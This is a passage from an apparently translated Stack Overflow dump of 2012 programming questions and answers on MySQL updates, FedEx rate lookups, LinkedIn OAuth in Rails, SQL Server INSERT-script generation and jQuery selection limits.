WHERE DRG = '470' AND PRINCIPLE_PROC_CD = '8154' 
      AND `Treatment Category Code` = '00601'; 
```

它在 6000 条表中找到 254 条记录。

我现在需要将这些的“治疗类别代码”从“00601”更改为“00801”

建议？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:12:52.347

尝试*[更新](http://dev.mysql.com/doc/refman/5.0/en/update.html)*语句：

```
UPDATE IP_cases_prelim 
SET 'Treatment Category Code' = '00801'
WHERE DRG = '470' AND PRINCIPLE_PROC_CD = '8154' AND Treatment Category Code = '00601'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:13:36.687

这个怎么样。

```
UPDATE IP_cases_prelim
SET    'Treatment Category Code' = '00801'
WHERE  DRG = '470' AND PRINCIPLE_PROC_CD = '8154' 
       AND 'Treatment Category Code' = '00601'; 
```

# php - 如何使用 php 获取 FedEx 运费

> ID：10991353
> 
> 赞同：2
> 
> 时间：2012-06-12T06:11:07.597
> 
> 标签：php, fedex

我想使用 php 从获取 FedEx Shipping 的运费中获取费率，但是如何？

我从[http://www.varnagiris.net/2006/06/01/php-fedex-shipping-rates-calculator/得到一些代码](http://www.varnagiris.net/2006/06/01/php-fedex-shipping-rates-calculator/)

和代码是

```
 $fedex = new Fedex;
    $fedex->setServer("https://gatewaybeta.fedex.com/GatewayDC");
    $fedex->setAccountNumber(123123123);
    $fedex->setMeterNumber(12312312);
    $fedex->setCarrierCode("FDXE");
    $fedex->setDropoffType("REGULARPICKUP");
    $fedex->setService($service, $serviceName);
    $fedex->setPackaging("YOURPACKAGING");
    $fedex->setWeightUnits("LBS");
    $fedex->setWeight(17);
    $fedex->setOriginStateOrProvinceCode("OH");
    $fedex->setOriginPostalCode(44333);
    $fedex->setOriginCountryCode("US");
    $fedex->setDestStateOrProvinceCode("CA");
    $fedex->setDestPostalCode(90210);
    $fedex->setDestCountryCode("US");
    $fedex->setPayorType("SENDER");

    $price = $fedex->getPrice(); 
```

但我不知道如何使用它？你能帮我吗。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-09T13:09:39.313

您需要先获得一个有效的帐户，仪表编号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-12-15T14:03:00.670

首先，您需要获得一个有效的 FedEx API 密钥。

1.  登录 FedEx 开发者中心：[http ://www.fedex.com/us/developer/web-services/index.html](http://www.fedex.com/us/developer/web-services/index.html)
2.  下载并阅读文档
3.  开发和测试
4.  认证。
5.  转移到生产。

为了获得费率服务、跟踪和 FedEx 定位器的批准，只需转到第 5 步。进入生产并填写按“获取生产密钥”按钮时出现的所有信息。

FedEx 将向您发送一封电子邮件，其中包含您的钥匙、仪表编号和密码。

您可以使用一些现成的示例来获取费率。这对你来说会更容易。

1.  [https://github.com/rubaiet/fedex](https://github.com/rubaiet/fedex) 或
2.  [https://github.com/JeremyDunn/php-fedex-api-wrapper](https://github.com/JeremyDunn/php-fedex-api-wrapper)

# php - MySQL & Form：根据第一个选择填充第二个选择选项（来自同一行）

> ID：10991356
> 
> 赞同：0
> 
> 时间：2012-06-12T06:11:33.230
> 
> 标签：php, mysql, database, forms

我的问题是，每种产品都有三种不同的库存尺寸，每种产品都包含不同数量的库存（大盒、中盒、小盒）。每个产品的盒子尺寸相同，但每盒的数量会发生变化。选择产品名称后，我想选择盒子大小，数量值应设置为与数据库中的产品行相对应。

```
------------------------------------------
|product      |small  |medium   |large   |
------------------------------------------
|Widget one   |100    |275     |400      |
------------------------------------------
|Widget two   |45     |100     |150      |
------------------------------------------
|Widget three |125    |150     |250      | 
```

我已经使用 php 从数据库中获取选择选项产品名称

```
 $product_select = mysql_query("SELECT * FROM products");

    echo '<select name="Product" id="product">'; 
    while ($row_item = mysql_fetch_array($product_select)){ 
    $pname = $row_item["product"]; 
    echo '<option value="' . htmlspecialchars($pname) . '">' . htmlspecialchars($pname)    . '</option>'; 
```

然后我需要这样的东西，根据上面选择的产品获取小型和大型的行值：

```
<select><option value=" ">Small</option><option value=" ">Medium</option><option value=" ">Large</option></select> 
```

**编辑**

我整晚都在试图弄清楚这一点。这甚至可能吗？我应该尝试走不同的路线吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T15:37:35.803

您有 3 种方法来实现这一点：

1.  在一个选择标签内使用 Optgroup 标签。
2.  在第一次选择中选择产品后，使用 Ajax 获取尺寸并进行第二次选择。
3.  将库存的序列化值存储在第一个选择中并从该值中填充第二个选择。例如：

    ```
     <select>
         <option values="100|275|400">Widget one</option>
         ...
         </select> 
    ```

# ruby-on-rails - Rails 3 Linkedin Gem（获取令牌后如何跨视图操作进行身份验证）

> ID：10991358
> 
> 赞同：0
> 
> 时间：2012-06-12T06:11:44.300
> 
> 标签：ruby-on-rails, authentication, oauth, gem, linkedin

在我的 session_controller.rb 我有这个：

```
require 'linkedin'

class SessionController < ApplicationController

  def connect

    # get your api keys at https://www.linkedin.com/secure/developer
    client = LinkedIn::Client.new(APP_CONFIG['linkedin']['apikey'], APP_CONFIG['linkedin']['secret_key'])
    request_token = client.request_token(:oauth_callback => 
                                      "http://#{request.host_with_port}/session/callback")
    session[:rtoken] = request_token.token
    session[:rsecret] = request_token.secret

    redirect_to client.request_token.authorize_url

  end

  def callback

    client = LinkedIn::Client.new(APP_CONFIG['linkedin']['apikey'], APP_CONFIG['linkedin']['secret_key'])
    if session[:atoken].nil?
      pin = params[:oauth_verifier]
      atoken, asecret = client.authorize_from_request(session[:rtoken], session[:rsecret], pin)
      session[:atoken] = atoken
      session[:asecret] = asecret
    else
      client.authorize_from_access(session[:atoken], session[:asecret])
    end

    redirect_to 'users/index'

  end

end 
```

这很好用，我现在的问题是如何检查“用户/索引”操作是否用户已经通过了 Linkedin 的 OAuth 流程？这是我正在尝试做的事情的开始：

```
 class UsersController < ApplicationController
      respond_to :html, :js, :json

      def index
          if authenticated?
              # set up a new LinkedIn client and show profile data
          else 
              redirect_to 'session/connect'
          end
      end

      ...

    private
      def authenticated?
          # what should i do here?        
          # return true if the user authenticated
          # return false if not
      end 
```

我知道我可能应该检查会话中是否设置了一些值，但我不确定我正在寻找哪一个。我知道将来我可能会移动“经过身份验证？” 方法，所以它在所有视图上调用，但这没关系。

有什么帮助吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-29T22:06:11.720

我处理这个问题的方法是将令牌和秘密值保存到我的用户数据库中的列中。然后，当我需要检查用户是否通过了 Linkedin 的 OAuth 流程时，我只需检查这些变量是否存在。我的回调方法与您的非常相似，只是增加了两行来存储令牌和机密。

```
def callback
  @user = current_user
  client = LinkedIn::Client.new("API Key", "Secret Key")
    if session[:atoken].nil? || session[:atoken]==""
      @pin = params[:oauth_verifier]
      atoken, asecret = client.authorize_from_request(session[:rtoken], session[:rsecret], @pin)

      #Used to Store atoken and asecret for user
      current_user.update_attribute(:link_tok, atoken)
      current_user.update_attribute(:link_sec, asecret)

    else
      client.authorize_from_access(current_user.link_tok, current_user.link_sec)
    end

    sign_in @user 
    flash.now[:success] = "You can now import data from LinkedIn to complete your profile"     
    render 'settings'
end 
```

此外，仅供参考，LinkedIn 对第三方应用程序从其 API 保存用户数据有严格的政策，因此您需要确保在执行此操作之前拥有所有正确的权限。

# sql-server-2005 - 如何从 sql server 2005 获取数据库转储

> ID：10991360
> 
> 赞同：0
> 
> 时间：2012-06-12T06:11:53.300
> 
> 标签：sql-server-2005

我有 SQL Server 2005，我正在寻找一种方法来进行数据库转储

反映数据库的一组创建 INSERT 语句，

提前致谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:23:12.400

有几种方法可以做到这一点。其中之一是使用 SMO。以下是 PowerShell 中的示例：

```
$ServerInstance = "MyServer\MyInstance"
$MyBackupPath = "c:\temp\MyDump.sql"

$tables = @(
    'table1',
    'table2',
    '...'
    'lasttable'
)

$server = New-Object ('Microsoft.SqlServer.Management.Smo.Server') $ServerInstance
$scripter = New-Object ('Microsoft.SqlServer.Management.Smo.Scripter') $server

$scripter.Options.SchemaQualify = $false
$scripter.Options.ScriptSchema = $false
$scripter.Options.ScriptData = $true
$scripter.Options.NoCommandTerminator = $true
$scripter.Options.ToFileOnly = $true
$scripter.Options.FileName = $MyBackupPath
$ServerUrn=$server.Urn 

$UrnsToScript = New-Object Microsoft.SqlServer.Management.Smo.UrnCollection

foreach ($t in $tables)
{ 
    $Urn = "$ServerUrn/Database[@Name='" + $database + "']/Table[@Name='" + $t + "' and @Schema='dbo']"
    $UrnsToScript.Add($Urn)
}

$scripter.EnumScript($UrnsToScript) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-13T11:31:18.320

我发现的最好方法是通过这段代码！

```
SET NOCOUNT ON
GO

PRINT 'Using Master database'
USE master
GO

PRINT 'Checking for the existence of this procedure'
IF (SELECT OBJECT_ID('sp_generate_inserts','P')) IS NOT NULL --means, the procedure already exists
    BEGIN
        PRINT 'Procedure already exists. So, dropping it'
        DROP PROC sp_generate_inserts
    END
GO

CREATE PROC sp_generate_inserts
(
    @table_name varchar(776),       -- The table/view for which the INSERT statements will be generated using the existing data
    @target_table varchar(776) = NULL,  -- Use this parameter to specify a different table name into which the data will be inserted
    @include_column_list bit = 1,       -- Use this parameter to include/ommit column list in the generated INSERT statement
    @from varchar(800) = NULL,      -- Use this parameter to filter the rows based on a filter condition (using WHERE)
    @include_timestamp bit = 0,         -- Specify 1 for this parameter, if you want to include the TIMESTAMP/ROWVERSION column's data in the INSERT statement
    @debug_mode bit = 0,            -- If @debug_mode is set to 1, the SQL statements constructed by this procedure will be printed for later examination
    @owner varchar(64) = NULL,      -- Use this parameter if you are not the owner of the table
    @ommit_images bit = 0,          -- Use this parameter to generate INSERT statements by omitting the 'image' columns
    @ommit_identity bit = 0,        -- Use this parameter to ommit the identity columns
    @top int = NULL,            -- Use this parameter to generate INSERT statements only for the TOP n rows
    @cols_to_include varchar(8000) = NULL,  -- List of columns to be included in the INSERT statement
    @cols_to_exclude varchar(8000) = NULL,  -- List of columns to be excluded from the INSERT statement
    @disable_constraints bit = 0,       -- When 1, disables foreign key constraints and enables them after the INSERT statements
    @ommit_computed_cols bit = 0        -- When 1, computed columns will not be included in the INSERT statement

)
AS
BEGIN

/***********************************************************************************************************
Procedure:  sp_generate_inserts  (Build 22) 
        (Copyright © 2002 Narayana Vyas Kondreddi. All rights reserved.)

Purpose:    To generate INSERT statements from existing data. 
        These INSERTS can be executed to regenerate the data at some other location.
        This procedure is also useful to create a database setup, where in you can 
        script your data along with your table definitions.

Written by: Narayana Vyas Kondreddi
            http://vyaskn.tripod.com

Acknowledgements:
        Divya Kalra -- For beta testing
        Mark Charsley   -- For reporting a problem with scripting uniqueidentifier columns with NULL values
        Artur Zeygman   -- For helping me simplify a bit of code for handling non-dbo owned tables
        Joris Laperre   -- For reporting a regression bug in handling text/ntext columns

Tested on:  SQL Server 7.0 and SQL Server 2000 and SQL Server 2005

Date created:   January 17th 2001 21:52 GMT

Date modified:  May 1st 2002 19:50 GMT

Email:      vyaskn@hotmail.com

NOTE:       This procedure may not work with tables with too many columns.
        Results can be unpredictable with huge text columns or SQL Server 2000's sql_variant data types
        Whenever possible, Use @include_column_list parameter to ommit column list in the INSERT statement, for better results
        IMPORTANT: This procedure is not tested with internation data (Extended characters or Unicode). If needed
        you might want to convert the datatypes of character variables in this procedure to their respective unicode counterparts
        like nchar and nvarchar

        ALSO NOTE THAT THIS PROCEDURE IS NOT UPDATED TO WORK WITH NEW DATA TYPES INTRODUCED IN SQL SERVER 2005 / YUKON

Example 1:  To generate INSERT statements for table 'titles':

        EXEC sp_generate_inserts 'titles'

Example 2:  To ommit the column list in the INSERT statement: (Column list is included by default)
        IMPORTANT: If you have too many columns, you are advised to ommit column list, as shown below,
        to avoid erroneous results

        EXEC sp_generate_inserts 'titles', @include_column_list = 0

Example 3:  To generate INSERT statements for 'titlesCopy' table from 'titles' table:

        EXEC sp_generate_inserts 'titles', 'titlesCopy'

Example 4:  To generate INSERT statements for 'titles' table for only those titles 
        which contain the word 'Computer' in them:
        NOTE: Do not complicate the FROM or WHERE clause here. It's assumed that you are good with T-SQL if you are using this parameter

        EXEC sp_generate_inserts 'titles', @from = "from titles where title like '%Computer%'"

Example 5:  To specify that you want to include TIMESTAMP column's data as well in the INSERT statement:
        (By default TIMESTAMP column's data is not scripted)

        EXEC sp_generate_inserts 'titles', @include_timestamp = 1

Example 6:  To print the debug information:

        EXEC sp_generate_inserts 'titles', @debug_mode = 1

Example 7:  If you are not the owner of the table, use @owner parameter to specify the owner name
        To use this option, you must have SELECT permissions on that table

        EXEC sp_generate_inserts Nickstable, @owner = 'Nick'

Example 8:  To generate INSERT statements for the rest of the columns excluding images
        When using this otion, DO NOT set @include_column_list parameter to 0.

        EXEC sp_generate_inserts imgtable, @ommit_images = 1

Example 9:  To generate INSERT statements excluding (ommiting) IDENTITY columns:
        (By default IDENTITY columns are included in the INSERT statement)

        EXEC sp_generate_inserts mytable, @ommit_identity = 1

Example 10:     To generate INSERT statements for the TOP 10 rows in the table:

        EXEC sp_generate_inserts mytable, @top = 10

Example 11:     To generate INSERT statements with only those columns you want:

        EXEC sp_generate_inserts titles, @cols_to_include = "'title','title_id','au_id'"

Example 12:     To generate INSERT statements by omitting certain columns:

        EXEC sp_generate_inserts titles, @cols_to_exclude = "'title','title_id','au_id'"

Example 13: To avoid checking the foreign key constraints while loading data with INSERT statements:

        EXEC sp_generate_inserts titles, @disable_constraints = 1

Example 14:     To exclude computed columns from the INSERT statement:
        EXEC sp_generate_inserts MyTable, @ommit_computed_cols = 1
***********************************************************************************************************/

SET NOCOUNT ON

--Making sure user only uses either @cols_to_include or @cols_to_exclude
IF ((@cols_to_include IS NOT NULL) AND (@cols_to_exclude IS NOT NULL))
    BEGIN
        RAISERROR('Use either @cols_to_include or @cols_to_exclude. Do not use both the parameters at once',16,1)
        RETURN -1 --Failure. Reason: Both @cols_to_include and @cols_to_exclude parameters are specified
    END

--Making sure the @cols_to_include and @cols_to_exclude parameters are receiving values in proper format
IF ((@cols_to_include IS NOT NULL) AND (PATINDEX('''%''',@cols_to_include) = 0))
    BEGIN
        RAISERROR('Invalid use of @cols_to_include property',16,1)
        PRINT 'Specify column names surrounded by single quotes and separated by commas'
        PRINT 'Eg: EXEC sp_generate_inserts titles, @cols_to_include = "''title_id'',''title''"'
        RETURN -1 --Failure. Reason: Invalid use of @cols_to_include property
    END

IF ((@cols_to_exclude IS NOT NULL) AND (PATINDEX('''%''',@cols_to_exclude) = 0))
    BEGIN
        RAISERROR('Invalid use of @cols_to_exclude property',16,1)
        PRINT 'Specify column names surrounded by single quotes and separated by commas'
        PRINT 'Eg: EXEC sp_generate_inserts titles, @cols_to_exclude = "''title_id'',''title''"'
        RETURN -1 --Failure. Reason: Invalid use of @cols_to_exclude property
    END

--Checking to see if the database name is specified along wih the table name
--Your database context should be local to the table for which you want to generate INSERT statements
--specifying the database name is not allowed
IF (PARSENAME(@table_name,3)) IS NOT NULL
    BEGIN
        RAISERROR('Do not specify the database name. Be in the required database and just specify the table name.',16,1)
        RETURN -1 --Failure. Reason: Database name is specified along with the table name, which is not allowed
    END

--Checking for the existence of 'user table' or 'view'
--This procedure is not written to work on system tables
--To script the data in system tables, just create a view on the system tables and script the view instead

IF @owner IS NULL
    BEGIN
        IF ((OBJECT_ID(@table_name,'U') IS NULL) AND (OBJECT_ID(@table_name,'V') IS NULL)) 
            BEGIN
                RAISERROR('User table or view not found.',16,1)
                PRINT 'You may see this error, if you are not the owner of this table or view. In that case use @owner parameter to specify the owner name.'
                PRINT 'Make sure you have SELECT permission on that table or view.'
                RETURN -1 --Failure. Reason: There is no user table or view with this name
            END
    END
ELSE
    BEGIN
        IF NOT EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = @table_name AND (TABLE_TYPE = 'BASE TABLE' OR TABLE_TYPE = 'VIEW') AND TABLE_SCHEMA = @owner)
            BEGIN
                RAISERROR('User table or view not found.',16,1)
                PRINT 'You may see this error, if you are not the owner of this table. In that case use @owner parameter to specify the owner name.'
                PRINT 'Make sure you have SELECT permission on that table or view.'
                RETURN -1 --Failure. Reason: There is no user table or view with this name      
            END
    END

--Variable declarations
DECLARE     @Column_ID int,         
        @Column_List varchar(8000), 
        @Column_Name varchar(128), 
        @Start_Insert varchar(786), 
        @Data_Type varchar(128), 
        @Actual_Values varchar(8000),   --This is the string that will be finally executed to generate INSERT statements
        @IDN varchar(128)       --Will contain the IDENTITY column's name in the table

--Variable Initialization
SET @IDN = ''
SET @Column_ID = 0
SET @Column_Name = ''
SET @Column_List = ''
SET @Actual_Values = ''

IF @owner IS NULL 
    BEGIN
        SET @Start_Insert = 'INSERT INTO ' + '[' + RTRIM(COALESCE(@target_table,@table_name)) + ']' 
    END
ELSE
    BEGIN
        SET @Start_Insert = 'INSERT ' + '[' + LTRIM(RTRIM(@owner)) + '].' + '[' + RTRIM(COALESCE(@target_table,@table_name)) + ']'      
    END

--To get the first column's ID

SELECT  @Column_ID = MIN(ORDINAL_POSITION)  
FROM    INFORMATION_SCHEMA.COLUMNS (NOLOCK) 
WHERE   TABLE_NAME = @table_name AND
(@owner IS NULL OR TABLE_SCHEMA = @owner)

--Loop through all the columns of the table, to get the column names and their data types
WHILE @Column_ID IS NOT NULL
    BEGIN
        SELECT  @Column_Name = QUOTENAME(COLUMN_NAME), 
        @Data_Type = DATA_TYPE 
        FROM    INFORMATION_SCHEMA.COLUMNS (NOLOCK) 
        WHERE   ORDINAL_POSITION = @Column_ID AND 
        TABLE_NAME = @table_name AND
        (@owner IS NULL OR TABLE_SCHEMA = @owner)

        IF @cols_to_include IS NOT NULL --Selecting only user specified columns
        BEGIN
            IF CHARINDEX( '''' + SUBSTRING(@Column_Name,2,LEN(@Column_Name)-2) + '''',@cols_to_include) = 0 
            BEGIN
                GOTO SKIP_LOOP
            END
        END

        IF @cols_to_exclude IS NOT NULL --Selecting only user specified columns
        BEGIN
            IF CHARINDEX( '''' + SUBSTRING(@Column_Name,2,LEN(@Column_Name)-2) + '''',@cols_to_exclude) <> 0 
            BEGIN
                GOTO SKIP_LOOP
            END
        END

        --Making sure to output SET IDENTITY_INSERT ON/OFF in case the table has an IDENTITY column
        IF (SELECT COLUMNPROPERTY( OBJECT_ID(QUOTENAME(COALESCE(@owner,USER_NAME())) + '.' + @table_name),SUBSTRING(@Column_Name,2,LEN(@Column_Name) - 2),'IsIdentity')) = 1 
        BEGIN
            IF @ommit_identity = 0 --Determing whether to include or exclude the IDENTITY column
                SET @IDN = @Column_Name
            ELSE
                GOTO SKIP_LOOP          
        END

        --Making sure whether to output computed columns or not
        IF @ommit_computed_cols = 1
        BEGIN
            IF (SELECT COLUMNPROPERTY( OBJECT_ID(QUOTENAME(COALESCE(@owner,USER_NAME())) + '.' + @table_name),SUBSTRING(@Column_Name,2,LEN(@Column_Name) - 2),'IsComputed')) = 1 
            BEGIN
                GOTO SKIP_LOOP                  
            END
        END

        --Tables with columns of IMAGE data type are not supported for obvious reasons
        IF(@Data_Type in ('image'))
            BEGIN
                IF (@ommit_images = 0)
                    BEGIN
                        RAISERROR('Tables with image columns are not supported.',16,1)
                        PRINT 'Use @ommit_images = 1 parameter to generate INSERTs for the rest of the columns.'
                        PRINT 'DO NOT ommit Column List in the INSERT statements. If you ommit column list using @include_column_list=0, the generated INSERTs will fail.'
                        RETURN -1 --Failure. Reason: There is a column with image data type
                    END
                ELSE
                    BEGIN
                    GOTO SKIP_LOOP
                    END
            END

        --Determining the data type of the column and depending on the data type, the VALUES part of
        --the INSERT statement is generated. Care is taken to handle columns with NULL values. Also
        --making sure, not to lose any data from flot, real, money, smallmomey, datetime columns
        SET @Actual_Values = @Actual_Values  +
        CASE 
            WHEN @Data_Type IN ('char','varchar','nchar','nvarchar') 
                THEN 
                    'COALESCE('''''''' + REPLACE(RTRIM(' + @Column_Name + '),'''''''','''''''''''')+'''''''',''NULL'')'
            WHEN @Data_Type IN ('datetime','smalldatetime') 
                THEN 
                    'COALESCE('''''''' + RTRIM(CONVERT(char,' + @Column_Name + ',109))+'''''''',''NULL'')'
            WHEN @Data_Type IN ('uniqueidentifier') 
                THEN  
                    'COALESCE('''''''' + REPLACE(CONVERT(char(255),RTRIM(' + @Column_Name + ')),'''''''','''''''''''')+'''''''',''NULL'')'
            WHEN @Data_Type IN ('text','ntext') 
                THEN  
                    'COALESCE('''''''' + REPLACE(CONVERT(char(8000),' + @Column_Name + '),'''''''','''''''''''')+'''''''',''NULL'')'                    
            WHEN @Data_Type IN ('binary','varbinary') 
                THEN  
                    'COALESCE(RTRIM(CONVERT(char,' + 'CONVERT(int,' + @Column_Name + '))),''NULL'')'  
            WHEN @Data_Type IN ('timestamp','rowversion') 
                THEN  
                    CASE 
                        WHEN @include_timestamp = 0 
                            THEN 
                                '''DEFAULT''' 
                            ELSE 
                                'COALESCE(RTRIM(CONVERT(char,' + 'CONVERT(int,' + @Column_Name + '))),''NULL'')'  
                    END
            WHEN @Data_Type IN ('float','real','money','smallmoney')
                THEN
                    'COALESCE(LTRIM(RTRIM(' + 'CONVERT(char, ' +  @Column_Name  + ',2)' + ')),''NULL'')' 
            ELSE 
                'COALESCE(LTRIM(RTRIM(' + 'CONVERT(char, ' +  @Column_Name  + ')' + ')),''NULL'')' 
        END   + '+' +  ''',''' + ' + '

        --Generating the column list for the INSERT statement
        SET @Column_List = @Column_List +  @Column_Name + ','   

        SKIP_LOOP: --The label used in GOTO

        SELECT  @Column_ID = MIN(ORDINAL_POSITION) 
        FROM    INFORMATION_SCHEMA.COLUMNS (NOLOCK) 
        WHERE   TABLE_NAME = @table_name AND 
        ORDINAL_POSITION > @Column_ID AND
        (@owner IS NULL OR TABLE_SCHEMA = @owner)

    --Loop ends here!
    END

--To get rid of the extra characters that got concatenated during the last run through the loop
SET @Column_List = LEFT(@Column_List,len(@Column_List) - 1)
SET @Actual_Values = LEFT(@Actual_Values,len(@Actual_Values) - 6)

IF LTRIM(@Column_List) = '' 
    BEGIN
        RAISERROR('No columns to select. There should at least be one column to generate the output',16,1)
        RETURN -1 --Failure. Reason: Looks like all the columns are ommitted using the @cols_to_exclude parameter
    END

--Forming the final string that will be executed, to output the INSERT statements
IF (@include_column_list <> 0)
    BEGIN
        SET @Actual_Values = 
            'SELECT ' +  
            CASE WHEN @top IS NULL OR @top < 0 THEN '' ELSE ' TOP ' + LTRIM(STR(@top)) + ' ' END + 
            '''' + RTRIM(@Start_Insert) + 
            ' ''+' + '''(' + RTRIM(@Column_List) +  '''+' + ''')''' + 
            ' +''VALUES(''+ ' +  @Actual_Values  + '+'')''' + ' ' + 
            COALESCE(@from,' FROM ' + CASE WHEN @owner IS NULL THEN '' ELSE '[' + LTRIM(RTRIM(@owner)) + '].' END + '[' + rtrim(@table_name) + ']' + '(NOLOCK)')
    END
ELSE IF (@include_column_list = 0)
    BEGIN
        SET @Actual_Values = 
            'SELECT ' + 
            CASE WHEN @top IS NULL OR @top < 0 THEN '' ELSE ' TOP ' + LTRIM(STR(@top)) + ' ' END + 
            '''' + RTRIM(@Start_Insert) + 
            ' '' +''VALUES(''+ ' +  @Actual_Values + '+'')''' + ' ' + 
            COALESCE(@from,' FROM ' + CASE WHEN @owner IS NULL THEN '' ELSE '[' + LTRIM(RTRIM(@owner)) + '].' END + '[' + rtrim(@table_name) + ']' + '(NOLOCK)')
    END 

--Determining whether to ouput any debug information
IF @debug_mode =1
    BEGIN
        PRINT '/*****START OF DEBUG INFORMATION*****'
        PRINT 'Beginning of the INSERT statement:'
        PRINT @Start_Insert
        PRINT ''
        PRINT 'The column list:'
        PRINT @Column_List
        PRINT ''
        PRINT 'The SELECT statement executed to generate the INSERTs'
        PRINT @Actual_Values
        PRINT ''
        PRINT '*****END OF DEBUG INFORMATION*****/'
        PRINT ''
    END

PRINT '--INSERTs generated by ''sp_generate_inserts'' stored procedure written by Vyas'
PRINT '--Build number: 22'
PRINT '--Problems/Suggestions? Contact Vyas @ vyaskn@hotmail.com'
PRINT '--http://vyaskn.tripod.com'
PRINT ''
PRINT 'SET NOCOUNT ON'
PRINT ''

--Determining whether to print IDENTITY_INSERT or not
IF (@IDN <> '')
    BEGIN
        PRINT 'SET IDENTITY_INSERT ' + QUOTENAME(COALESCE(@owner,USER_NAME())) + '.' + QUOTENAME(@table_name) + ' ON'
        PRINT 'GO'
        PRINT ''
    END

IF @disable_constraints = 1 AND (OBJECT_ID(QUOTENAME(COALESCE(@owner,USER_NAME())) + '.' + @table_name, 'U') IS NOT NULL)
    BEGIN
        IF @owner IS NULL
            BEGIN
                SELECT  'ALTER TABLE ' + QUOTENAME(COALESCE(@target_table, @table_name)) + ' NOCHECK CONSTRAINT ALL' AS '--Code to disable constraints temporarily'
            END
        ELSE
            BEGIN
                SELECT  'ALTER TABLE ' + QUOTENAME(@owner) + '.' + QUOTENAME(COALESCE(@target_table, @table_name)) + ' NOCHECK CONSTRAINT ALL' AS '--Code to disable constraints temporarily'
            END

        PRINT 'GO'
    END

PRINT ''
PRINT 'PRINT ''Inserting values into ' + '[' + RTRIM(COALESCE(@target_table,@table_name)) + ']' + ''''

--All the hard work pays off here!!! You'll get your INSERT statements, when the next line executes!
EXEC (@Actual_Values)

PRINT 'PRINT ''Done'''
PRINT ''

IF @disable_constraints = 1 AND (OBJECT_ID(QUOTENAME(COALESCE(@owner,USER_NAME())) + '.' + @table_name, 'U') IS NOT NULL)
    BEGIN
        IF @owner IS NULL
            BEGIN
                SELECT  'ALTER TABLE ' + QUOTENAME(COALESCE(@target_table, @table_name)) + ' CHECK CONSTRAINT ALL'  AS '--Code to enable the previously disabled constraints'
            END
        ELSE
            BEGIN
                SELECT  'ALTER TABLE ' + QUOTENAME(@owner) + '.' + QUOTENAME(COALESCE(@target_table, @table_name)) + ' CHECK CONSTRAINT ALL' AS '--Code to enable the previously disabled constraints'
            END

        PRINT 'GO'
    END

PRINT ''
IF (@IDN <> '')
    BEGIN
        PRINT 'SET IDENTITY_INSERT ' + QUOTENAME(COALESCE(@owner,USER_NAME())) + '.' + QUOTENAME(@table_name) + ' OFF'
        PRINT 'GO'
    END

PRINT 'SET NOCOUNT OFF'

SET NOCOUNT OFF
RETURN 0 --Success. We are done!
END

GO

PRINT 'Created the procedure'
GO

--Mark procedure as system object
EXEC sys.sp_MS_marksystemobject sp_generate_inserts
GO

PRINT 'Granting EXECUTE permission on sp_generate_inserts to all users'
GRANT EXEC ON sp_generate_inserts TO public

SET NOCOUNT OFF
GO

PRINT 'Done' 
```

# javascript - 使用 jquery 或 javascript 从某个位置导出 excel 文件

> ID：10991361
> 
> 赞同：-1
> 
> 时间：2012-06-12T06:11:53.427
> 
> 标签：javascript, jquery

我的 C 盘上的文件夹中有一个 excel 文件。现在我想从 jquery/javascript 导出/打开它。请帮帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:16:33.610

这是不可能的。出于安全原因，无法使用 javascript 访问文件系统。

如果可能，恶意网页很容易窃取您的文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:18:15.777

您无法使用 javascript 或 jQuery 打开它。

也许您应该考虑使用文件上传控件上传文件。然后，您可以在文件上传后使用该文件。

看看这件事的“如何”方面-> [http://www.tizag.com/phpT/fileupload.php](http://www.tizag.com/phpT/fileupload.php)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T06:19:13.850

在我看来，我们无法在 javascript 或 jquery 中访问机器驱动器。

在 servlet 中编写一些 java/c# 代码以将其转换为二进制流。

然后在你的 html 中使用 iframe 或对象来显示它

# javascript - 如何对表格进行可选限制

> ID：10991363
> 
> 赞同：2
> 
> 时间：2012-06-12T06:12:06.390
> 
> 标签：javascript, jquery, jquery-ui

我很难解决这个小提琴。当我设置限制时，我无法选择任何框。有什么建议么？？

我做了以下小提琴来展示这个例子。

[http://jsfiddle.net/dw6Hf/28](http://jsfiddle.net/dw6Hf/28)

```
 $(function() {
    $(".selectable").selectable({
 filter: "td.cs:lt(4)",

      stop: function(){
        var result = $("#select-result").empty();
        var result2 = $("#result2");
      $('.ui-selecting:gt(31)').removeClass("ui-selecting");

     $(".ui-selected", this).each(function(){

          var cabbage = this.id + ', ';
          result.append(cabbage);
        });

        var newInputResult = $('#select-result').text(); 
            newInputResult = newInputResult.substring(0, newInputResult.length - 1);
            result2.val(newInputResult); 
      }
    });
  }); 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:20:31.490

你想达到什么目标？你说的是哪些限制？如果您`lt(4)`在 中使用`filter`，您要求`selectable`只允许选择前 4 个框。

我已经修改了您的小提琴： http: [//jsfiddle.net/dw6Hf/40/](http://jsfiddle.net/dw6Hf/40/)，您将看到添加了以下内容：-

```
 if($(".ui-selected").length>4)
          {
     $(".ui-selected", this).each(function(i,e){
         if(i>3)
         {
         $(this).removeClass("ui-selected");
         }
     });   
return;              
          } 
```

这现在将选择最多 4 个框..

更新：在他们被选中期间不允许：- [http://jsfiddle.net/dw6Hf/43/](http://jsfiddle.net/dw6Hf/43/)

```
selecting: function(i,e){
                    if($(".ui-selecting").length>4)
          {
     $(".ui-selecting", this).each(function(i,e){
         if(i>3)
         {
         $(this).removeClass("ui-selecting");
         }
     });   
return;              
          }     
        }, 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T06:58:08.020

这是另一种解决方案，它不使用 JqueryUI，但无论如何可能是您想要的。它基本上切换在单击框上选择的类，最多可以选择 4 个。我将所选课程添加到您的 css

```
$(".cs").click(function(){
 var numItems = $('.selected').length   
if(numItems < 4) {          
     $(this).toggleClass("selected");   
}   

